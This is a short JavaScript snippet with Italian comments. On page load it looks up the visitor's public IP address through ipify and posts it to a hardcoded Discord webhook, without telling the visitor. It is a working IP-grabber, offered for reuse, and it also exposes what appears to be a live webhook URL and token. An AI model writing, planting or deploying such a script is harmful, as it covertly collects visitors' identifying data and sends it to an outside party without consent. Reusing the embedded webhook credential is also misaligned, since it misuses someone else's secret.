document.addEventListener("DOMContentLoaded", function() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            console.log("Your IP address is: ", data.ip);
            // Rimuovi o commenta la linea seguente se non vuoi visualizzare l'IP sulla pagina
            // document.getElementById('ip-address').textContent = data.ip;
            sendToDiscord(data.ip);
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
            // Rimuovi o commenta la linea seguente se non vuoi visualizzare l'errore sulla pagina
            // document.getElementById('ip-address').textContent = 'Errore nel recupero dell\'IP';
        });
});

function sendToDiscord(ip) {
    const webhookUrl = 'https://discordapp.com/api/webhooks/1342611002822234276/pRik-szA0iIK4gXyX2nkCawHLhw0Y_Yif1mU90IpFZoNqnSMrlPLJ_WC1Qg1HWifppuS'; // Sostituisci con l'URL della tua webhook

    const message = {
        content: `L'indirizzo IP dell'utente è: ${ip}`
    };

    console.log('Sending message to Discord:', message);

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        if (response.ok) {
            console.log('Messaggio inviato al bot di Discord');
        } else {
            console.error('Errore nell\'invio del messaggio al bot di Discord:', response.statusText);
        }
    })
    .catch(error => console.error('Errore nella richiesta alla webhook di Discord:', error));
}
